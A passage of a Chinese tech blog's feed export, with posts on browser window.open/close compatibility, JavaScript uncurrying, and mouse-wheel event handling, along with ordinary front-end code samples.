class="name">option</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　只要这个iframe的z-index比你弹出层的z-index小就行了。</p><h3>Reference</h3><p>　　1.《JavaScript权威指南（第六版）》</p><p>　　2.&nbsp;<a href="http://www.cnblogs.com/Darren_code/archive/2012/03/05/z-index.html#darren_7" target="_blank">聂微东</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> options </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打开窗口，关闭窗口</title>
      <link href="/blog/2013/04/10/cb-window-open-and-close/"/>
      <url>/blog/2013/04/10/cb-window-open-and-close/</url>
      
        <content type="html"><![CDATA[<p><strong>关键词</strong><span>：window.open() window.close() showModalDialog() 兼容性 测试等。</span></p><p>　　　　本文默认你对以上函数参数有基本了解。</p><h3>window.open</h3><p>　　window.open如果没有加第三个参数，则浏览器一般都会在新的标签页打开（除非你设置了新建窗口打开）</p><p>　　而有的时候，我们需要他弹出来。就想这个一样：</p><p>　　<img src="https://images.cnitblog.com/blog/387325/201304/10152902-23e3b118ba574a799ec021740f524b44.png" alt="" width="369" height="416"></p><p>　　上述方式是：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">window.open(<span class="regexp">/*URL*/</span><span class="string">&quot;&quot;</span>,<span class="regexp">/*Name*/</span><span class="string">&quot;&quot;</span>,<span class="regexp">/*args*/</span><span class="string">&quot;width=300,height=400&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　但是搜狗是不会挺你的话的，他不会新建一个你设定的窗口打开，而是在一个新的标签页打开。</p><p><img src="https://images.cnitblog.com/blog/387325/201304/10153253-8b065b78f11e4696a8e1bac972f17892.png" alt=""></p><p>　　这个，你就认了吧！如果不服气，你可以用下面的函数来解决。</p><h3>showModalDialog</h3><p>　　试了下，chrome、FF、IE下都能跳出一个模态框口出来。</p><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span>.showModalDia<span class="meta">log</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;dialogHeight=200,dialogWidth=300&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　<em>注意:这里的第三个参数有一些不同，加了个前缀dialog。</em></p><p>　　不过搜狗又有点变态了，</p><p>　　1.&nbsp;如果你的第一个参数不写，即为空时，弹不出来。</p><p>　　2. 如果第一个参数的URL地址和window.location不是同一个域内（<a title="同域 跨域" href="http://www.cnblogs.com/hustskyking/archive/2013/03/31/CDS-introduce.html" target="_blank">什么是同域</a>），则会这样：</p><p><img src="https://images.cnitblog.com/blog/387325/201304/10154058-49b2fbb3642249068a966f24e85ec794.png" alt=""></p><p>　　会弹出一个存在安全隐患的提示，这个也是个烦人的东西，修改IE的安全项应该可以解决问题。这里不多说。</p><h3>window.close</h3><p>　　这个不用说，大家问题遇到最多的就是这个东西的bug。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　如果单单是这一句话，IE（搜狗等）会弹出这么一个提示：</p><p>　　<img src="https://images.cnitblog.com/blog/387325/201304/10154422-fc71b242e25a4b8c8c750d3abf6094fb.png" alt=""></p><p>　　FF和chrome无反应。如果加点东西：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一步，如果该窗口是被他爸爸打开的，先断绝父子关系</span></span><br><span class="line"><span class="keyword">window</span>.opener = null;</span><br><span class="line"><span class="comment">//window.close()只允许关系自己打开的窗口</span></span><br><span class="line"><span class="comment">//用一个空页面替换掉现在的页面</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">window</span>.<span class="keyword">open</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;_self&quot;</span>);</span><br><span class="line"><span class="comment">//然后关闭自己打开的页面</span></span><br><span class="line">a.<span class="keyword">close</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　效果还行，把chrome的页面给关闭了，IE的弹出框也没了，不过可恶的FF依然没有反应！！！抓狂！！！！</p><h3>干掉FireFox</h3><p>　　我们退而求其次，既然关不掉你，我就把你换成一个空页面算了！</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window.location.href</span>=<span class="string">&quot;about:blank&quot;</span><span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　之所以window.close在firefox不能使用，是因为firefox默认不能关闭用户打开的网页。知道原因有个毛用，还是没办法把他kill掉。。。</p><p>　　有人说：</p><blockquote><p>我们可以这样设置firefox：　　打开firefox,在地址栏输入about:config　　找到dom.allow_scripts_to_close_windows这项并改为true。</p></blockquote><p>　　这样就可以解决Firefox的问题了，但是，难道你打算让用户这么去干?</p><p>不过还是恳请大神们找一个完美解决window.close的方案，坐等！！！</p><p><strong>提供测试代码，省得你再打一次~</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//&lt;![[</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//window.opener = null</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> b = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;asdfs&quot;</span>,<span class="string">&quot;width=300,height=400&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//window.showModalDialog(&quot;http://www.baidu.com&quot;,&quot;&quot;,&quot;dialogHeight=200,dialogWidth=300&quot;);</span></span></span><br><span class="line"><span class="language-javascript">            b.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./jQueryDemo.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//alert(a.name)</span></span></span><br><span class="line"><span class="language-javascript">            b.<span class="property">opener</span>.<span class="title function_">getElmentById</span>(<span class="string">&quot;i&quot;</span>).<span class="title function_">focus</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//window.close();</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//第一步，如果该窗口是被他爸爸打开的，先断绝父子关系</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//window.opener = null; </span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//window.close()只允许关系自己打开的窗口</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//用一个空页面替换掉现在的页面</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//var a = window.open(&quot;&quot;, &quot;_self&quot;);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//然后关闭自己打开的页面</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//a.close();</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//]]&gt;</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">onclick</span>=<span class="string">&quot;a()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>11111<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>22222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>33333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>44444<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;i&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript中有趣的反柯里化</title>
      <link href="/blog/2013/04/09/cb-uncurrying/"/>
      <url>/blog/2013/04/09/cb-uncurrying/</url>
      
        <content type="html"><![CDATA[<h3>相关阅读</h3><p>　　1.<a href="http://www.cnblogs.com/jkisjk/archive/2013/01/07/2848687.html" target="_blank">JKisJK&nbsp;</a></p><p>　　2.<a href="http://www.silverna.org/blog/?p=211" target="_blank">月影</a></p><p>　　3.<a href="http://www.zhangxinxu.com/wordpress/2013/02/js-currying/" target="_blank">张鑫旭</a></p><h3>AlloyTeam作品</h3><p>反科里化的话题来自javascript之父Brendan Eich去年的一段twitter. 近几天研究了一下，觉得这个东东非常有意思，分享一下。先忘记它的名字，看下它能做什么.</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145419-0c4532f9dbc34beba6ef575c9b3245ff.gif" alt=""></p><p>不要小看这个功能，试想下，我们在写一个库的时候，时常会写这样的代码，拿webQQ的Jx库举例。<span id="more-4304"></span></p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145432-f862f0d75f8c4998964014bb62392d56.gif" alt="">我们想要的，其实只是借用Array原型链上的一些函数。并没有必要去显式的构造一个新的函数来改变它们的参数并且重新运算。</p><p>如果用uncurrying的方式显然更加优雅和美妙，就像这样：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145438-8d1d7b65b24c467eb7775991d66ccbaa.gif" alt=""></p><p>还能做很多有趣和方便的事情.</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145444-329bcaa1a1d74f3a9482a5ba21c4aafd.jpg" alt=""></p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145453-21aa5b1218734c2a91ab88b23bfc649b.jpg" alt=""></p><p>甚至还能把call和apply方法都uncurrying，把函数也当作普通数据来使用. 使得javascript中的函数调用方式更像它的前生scheme, 当函数名本身是个变量的时候, 这种调用方法特别方便.</p><p>scheme里面调用函数是这样:<img src="https://images.cnitblog.com/blog/387325/201312/20145500-f54106662e67418ba605afdd064de16e.jpg" alt=""></p><p>javascript里可以写的很接近.<img src="https://images.cnitblog.com/blog/387325/201312/20145506-cc554a4bcd0e46fd98cf67e9c8087193.jpg" alt=""></p><p>再看看jquery库，由于jquery对象( 即通过$()创建的对象 )是一个对象冒充的伪数组，它有length属性，并且能够通过下标查找对应的元素，当需要给jquery对象添加一个成员时, 伪代码大概是：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145559-013d59c9fdab4eb9b7e7876333e96348.gif" alt=""></p><p>如果用uncurrying的话, 就可以</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145610-7c99ecca127e4b70b5d211bd168df3fa.gif" alt=""></p><p>借用了array对象的push函数, 让引擎去自动管理数组成员和length属性.</p><p>而且可以一次把需要的函数全部借过来, 一劳永逸. 一段测试代码:</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145617-d1f0c7438fba4e6eb0d0ad663ad021eb.gif" alt=""></p><p>总的来说, 使用uncurrying技术, 可以让任何对象拥有原生对象的方法. 好了，如果到这里依然没有引起你的兴趣，那么你可以去干点别的了。</p><p>接下来一步一步来看看原理以及实现。在了解反currying化这个奇怪的名字之前，我们得先搞清楚currying。</p><p>维基百科上的定义：科里化( currying ); 又称部分求值，是把接受多个参数的函数变换成接受一个单一参数的函数，并且返回接受余下的参数并且返回结果的新函数的技术。</p><p>通俗点讲，currying有点类似买房子时分期付款的方式，先给一部分首付( 一部分参数 )， 返回一个存折（ 返回一个函数 ），合适的时候再给余下的参数并且求值计算。</p><p>来看看我们都用过的currying, 我们经常在绑定context 的时候实现一个Function.prototype.bind函数.</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145625-f26f1779a1fe48a2a4bf6dedddd7c1b6.gif" alt=""></p><p>高阶函数是实现currying的基础, 所谓高阶函数至少满足这2个特性：1， 函数可以当作参数传递，2， 函数可以作为返回值。</p><p>Javascript在设计之初，参考了很多scheme语言的特性。而scheme是函数式语言鼻祖lisp的2大方言之一，所以javascript也拥有一些函数式语言的特性，包括高阶函数，闭包，lambda表达式等。</p><p>当javascript中的函数返回另一个函数，此时会形成一个闭包，而在闭包中就可以保存第一次运算的参数，我们用这个思想，来写一个通用的currying函数。</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145636-997da99667814abfbc92d91c565ccee2.gif" alt=""></p><p>我们约定, 当传入参数时候, 继续currying化, 参数为空时才开始求值.</p><p>假设在实现一个计算每月花费的函数, 每天结束前我们都要记录今天花了多少钱, 但我们只关心月底的花费总值, 无需每天都计算一次.</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145643-7b5112ed6a4b44a6806543e3cf2e0863.gif" alt=""></p><p>使用currying函数, 便可以延迟到最后一刻才一起计算, 好处不言而喻, 在很多场合可以避免无谓的计算, 节省性能, 也是实现惰性求值的一种方案.</p><p>好了，现在才走进正题，</p><p>curring是预先填入一些参数.</p><p>反curring就是把原来已经固定的参数或者this上下文等当作参数延迟到未来传递.</p><p>其实就是搞这样一个事情，将：</p><p>obj.foo( arg1 ) //foo本来是只在obj上的函数. 就像push原本只在Array.prototype上</p><p>转化成这样的形式</p><p>foo( obj, arg1 ) // 跟我们举的第一个例子一样.将[].push转换成push( [] )</p><p>就像原本是接在电视插头上的插座，把它拆下来之后，其实也能用来接冰箱。</p><p>Ecma上Array和String的每个原型方法后面都有这么一段话，比如push：</p><blockquote><p>NOTE The push function is intentionally generic; it does not require that its this value be an Array object.Therefore it can be transferred to other kinds of objects for use as a method. Whether the concat function can be applied.</p></blockquote><p>Javascript为什么要这样设计, 我们先来复习下动态语言中重要的鸭子类型思想.</p><p>说个故事：</p><blockquote><p>很久以前有个皇帝喜欢听鸭子呱呱叫，于是他召集大臣组建一个一千只鸭子的合唱团。大臣把全国的鸭子都抓来了，最后始终还差一只。有天终于来了一只自告奋勇的鸡，这只鸡说它也会呱呱叫，好吧在这个故事的设定里，它确实会呱呱叫。 后来故事的发展很明显，这只鸡混到了鸭子的合唱团中。&mdash; 皇帝只是想听呱呱叫，他才不在乎你是鸭子还是鸡呢。</p></blockquote><p>这个就是鸭子类型的概念，在javascript里面，很多函数都不做对象的类型检测，而是只关心这些对象能做什么。</p><p>Array构造器和String构造器的prototype上的方法就被特意设计成了鸭子类型。这些方法不对this的数据类型做任何校验。这也就是为什么arguments能冒充array调用push方法.</p><p>看下v8引擎里面Array.prototype.push的代码:</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">function ArrayPush() &#123;</span><br><span class="line">  <span class="keyword">var</span> n = TO_UINT32( <span class="keyword">this</span>.length );</span><br><span class="line">  <span class="keyword">var</span> m = %_ArgumentsLength();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="keyword">this</span>[i+n] = %_Arguments(i); <span class="comment">//属性拷贝</span></span><br><span class="line">    <span class="keyword">this</span>.length = n + m; <span class="comment">//修正length</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，ArrayPush方法没有对this的类型做任何显示的限制，所以理论上任何对象都可以被传入ArrayPush这个访问者。</p><p>我们需要解决的只剩下一个问题， 如何通过一种通用的方式来使得一个对象可以冒充array对象。</p><p>真正的实现代码其实很简单:</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20145653-2d027437a9b546aaad15caa9dbed2672.gif" alt=""></p><p>这段代码虽然很短, 初次理解的时候还是有点费力. 我们拿push的例子看看它发生了什么.</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">push</span> = <span class="built_in">Array</span>.prototype.<span class="built_in">push</span>.uncurrying();</span><br><span class="line"><span class="built_in">push</span>( obj, <span class="string">&quot;first&quot;</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://images.cnitblog.com/blog/387325/201312/20145700-432ff23c4d42442abcdadf7777586aa4.gif" alt=""></p><p>本文转自：<a class="blogTitle btitle" title="javascript中有趣的反柯里化" href="http://www.alloyteam.com/2012/12/4304/" rel="bookmark">javascript中有趣的反柯里化</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 柯里化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript之鼠标滚动事件</title>
      <link href="/blog/2013/04/09/cb-mousewheel/"/>
      <url>/blog/2013/04/09/cb-mousewheel/</url>
      
        <content type="html"><![CDATA[<p><span>最近正在做评论模块的</span><a href="http://blog.163.com/jinlu_hz/blog/static/11383015220112251147684/" target="_blank">image LazyLoad</a><span>（图片资源延迟加载/按需加载），其中涉及到一些mouse scroll操作。老外的</span><a href="http://adomas.org/javascript-mouse-wheel/" rel="nofollow" target="_blank">Mouse wheel programming in JavaScript</a><span>一文，对我很有价值。</span><span>&mdash;&mdash;以下为翻译&mdash;&mdash;</span><span>本文有些信息可能已经过时，但是大部分知识点仍旧有用。</span><span>Web应用日新月异，也越来越接近于桌面应用。功能上越来越强，比如drag<drop（拖拽），autocompletition（自动完成/自动补全）等等。在AJAX的配合下，这些应用都易于实现。</span><span>本文要说的并不是AJAX技术，而是关于相对简单的用户输入手段&mdash;&mdash;鼠标滚轮。目前已经很难找到不带滚轮的鼠标了，大多数用户会使用滚轮用来滚动浏览器、缩放页面/照片之类的操作。Web应用在这个领域却鲜有建树。本文将提供一些基于鼠标滚轮的javascript事件和相关的处理手段。</span></p><h3>Annotated code 带注释的代码</h3><p><span>下面是一段带注释的javascript代码，阐述鼠标滚动事件背后的一些原理。</span><span>//此处不准备对代码注释进行翻译，<a href="http://adomas.org/javascript-mouse-wheel/plain.html" rel="nofollow" target="_blank">查看源代码</a></span></p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This is high-level function.</span></span><br><span class="line"><span class="comment"> * It must react to delta being more/less than zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">delta</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (delta &lt; <span class="number">0</span>)</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        ...;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Event handler for mouse wheel event.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wheel</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> delta = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!event) <span class="comment">/* For IE. */</span></span><br><span class="line">        event = <span class="built_in">window</span>.event;</span><br><span class="line">    <span class="keyword">if</span> (event.wheelDelta) &#123; <span class="comment">/* IE/Opera. */</span></span><br><span class="line">        delta = event.wheelDelta / <span class="number">120</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * In Opera 9, delta differs in sign as compared to IE.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.opera)</span><br><span class="line">            delta = -delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (event.detail) &#123;</span><br><span class="line">        <span class="comment">/** Mozilla case. */</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * In Mozilla, sign of delta is different than in IE.</span></span><br><span class="line"><span class="comment">         * Also, delta is multiple of 3.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">            delta = -event.detail / <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * If delta is nonzero, handle it.</span></span><br><span class="line"><span class="comment">     * Basically, delta is now positive if wheel was scrolled up,</span></span><br><span class="line"><span class="comment">     * and negative, if wheel was scrolled down.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (delta)</span><br><span class="line">        handle(delta);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Prevent default actions caused by mouse wheel.</span></span><br><span class="line"><span class="comment">     * That might be ugly, but we handle scrolls somehow</span></span><br><span class="line"><span class="comment">     * anyway, so don&#x27;t bother here..</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault)</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    event.returnValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialization code.</span></span><br><span class="line"><span class="comment"> * If you use your own event management code, change it as required.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.addEventListener)</span><br><span class="line">    <span class="comment">/** DOMMouseScroll is for mozilla. */</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;DOMMouseScroll&#x27;</span>, wheel, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">/** IE/Opera. */</span></span><br><span class="line"><span class="built_in">window</span>.onmousewheel = <span class="built_in">document</span>.onmousewheel = wheel;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Handler function 事件处理函数</h3><p><span>代码中的"handle"是用户的自定义函数，其中带了一个参数为delta。由</span><img src="https://adomas.org/javascript-mouse-wheel/deltas.png" alt="Deltas pictured. Negative means down, positive up."><span>于浏览器平台的差异性，我们只能够捕捉到滚动的差值（deltas），这个值是滚轮的变化值。</span><span>通常，你只能获取到delta的正值与负值，如左图所示。</span><span>如果delta是正值，滚动向前滚动，反之则为向后滚动。在许多应用中，向上滚动就是页面向上滚动。</span><span>你可能很疑惑，delta的实际值到底会是什么。实际上，上述代码其实是被调整过的，使得99%的情况下获取到的值要么-1要么就是+1。即时如此，如果在firefox下迅速滚动，会出现&plusmn;3的情况。</span><a href="http://digg.com/programming/Mouse_wheel_programming_in_JavaScript#c2431219" rel="nofollow" target="_blank">Digg</a><span>上有人提出14的delta值，Geoffrey Kruse在他的pc上甚至得到了76的值。当然了，这也取决于鼠标敏感度的设置。firefox有一些微妙的现象：如果快速滚动的同时点击右键（原文 scrolling the wheel fast and then push the right mouse button for the menu），会报出例如30的delta值。</span><span>//不明白作者是如何触发这个操作的</span><a href="http://www.robsite.de/" rel="nofollow" target="_blank">Robert Gerlach</a><span>在Safari下做了一些测试："只是滚动一圈的话，值为+-0.1，如果滚动地稍微快点的话（多滚动几圈），这个值也会变大。 这是因为Mac OS下有鼠标滚轮加速功能。滚动一次，浏览器滚动1像素，滚动3次，浏览器却滚动30像素"。同时他也对Camino（基于Gecko的内核引擎）进行研究：\与Safari相似（+- 0.3 to +-Infinity），虽然使用了与firefox相同的内核引擎，但结果这个delta值却只在+-2.666666里浮动，无论滚动速度如何。"</span><span>在此可以看一下</span><a href="http://adomas.org/javascript-mouse-wheel/test.html" rel="nofollow" target="_blank">测试页面A</a><span>与</span><a href="http://adomas.org/javascript-mouse-wheel/test2.html" rel="nofollow" target="_blank">测试页面B</a><span>。</span></p><h3>Compatability 兼容性</h3><p><span>//作者在此感谢了许多人，不作翻译</span></p><h3>Usability 可用性</h3><p><span>Few \don't"s&mdash;&mdash;几个不要</span></p><ul><li>不要使用滚动进行一些不符合常理的操作，用户已经习惯用滚轮来作页面滚动之类的操作了。一些map应用使用滚轮进行缩放，这个操作符合用户的预期，大胆使用即可。</li><li>不要强迫用户依赖滚轮进行操作。<span>//作者的意思</span><span>是</span><span>应该</span><span>提供一种可替换方案，使得在滚轮操作无效的情况下，应用程序仍旧可用</span></li><li>尽量避免全局滚动条，这些滚动条可能会给用户在进行滚动时带来一些困惑。</li></ul><h3>Real world examples 应用实例</h3><p><a href="http://maps.google.com/" rel="nofollow" target="_blank">Google Maps</a><span>利用滚轮进行zoom in/out。</span><a href="http://mapper.acme.com/" rel="nofollow" target="_blank">ACME Mapper</a><span>Google Maps的增强版</span><span>//在chrome10下滚动无效</span><a href="http://imageflow.finnrudolph.de/" rel="nofollow" target="_blank">ImageFlow</a><span>&nbsp;by Finn Rudolph</span></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Event handler for mouse wheel event.</span></span><br><span class="line"><span class="comment">         *鼠标滚动事件</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">var</span> wheel = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> delta = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!event) <span class="comment">/* For IE. */</span></span><br><span class="line">                event = window.event;</span><br><span class="line">            <span class="keyword">if</span> (event.wheelDelta) &#123; <span class="comment">/* IE/Opera. */</span></span><br><span class="line">                delta = event.wheelDelta / <span class="number">120</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.detail) &#123;</span><br><span class="line">                <span class="comment">/** Mozilla case. */</span></span><br><span class="line">                <span class="comment">/** In Mozilla, sign of delta is different than in IE.</span></span><br><span class="line"><span class="comment">                 * Also, delta is multiple of 3.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                delta = -event.detail / <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/** If delta is nonzero, handle it.</span></span><br><span class="line"><span class="comment">             * Basically, delta is now positive if wheel was scrolled up,</span></span><br><span class="line"><span class="comment">             * and negative, if wheel was scrolled down.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (delta)</span><br><span class="line">                handle(delta);</span><br><span class="line">            <span class="comment">/** Prevent default actions caused by mouse wheel.</span></span><br><span class="line"><span class="comment">             * That might be ugly, but we handle scrolls somehow</span></span><br><span class="line"><span class="comment">             * anyway, so don&#x27;t bother here..</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (event.preventDefault)</span><br><span class="line">                event.preventDefault();</span><br><span class="line">            event.returnValue = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Initialization code.</span></span><br><span class="line"><span class="comment">         * If you use your own event management code, change it as required.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (window.addEventListener) &#123;</span><br><span class="line">            <span class="comment">/** DOMMouseScroll is for mozilla. */</span></span><br><span class="line">            window.addEventListener(<span class="string">&#x27;DOMMouseScroll&#x27;</span>, wheel, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/** IE/Opera. */</span></span><br><span class="line">        window.onmousewheel = document.onmousewheel = wheel;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** This is high-level function.</span></span><br><span class="line"><span class="comment">         * It must react to delta being more/less than zero.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">var</span> handle = <span class="keyword">function</span>(<span class="params">delta</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> random_num = Math.<span class="built_in">floor</span>((Math.<span class="built_in">random</span>() * <span class="number">100</span>) + <span class="number">50</span>);</span><br><span class="line">            <span class="keyword">if</span> (delta &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// alert(&quot;鼠标滑轮向下滚动：&quot; + delta + &quot;次！&quot;); // 1</span></span><br><span class="line">                $(<span class="string">&quot;btn_next_pic&quot;</span>).onclick(random_num);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// alert(&quot;鼠标滑轮向上滚动：&quot; 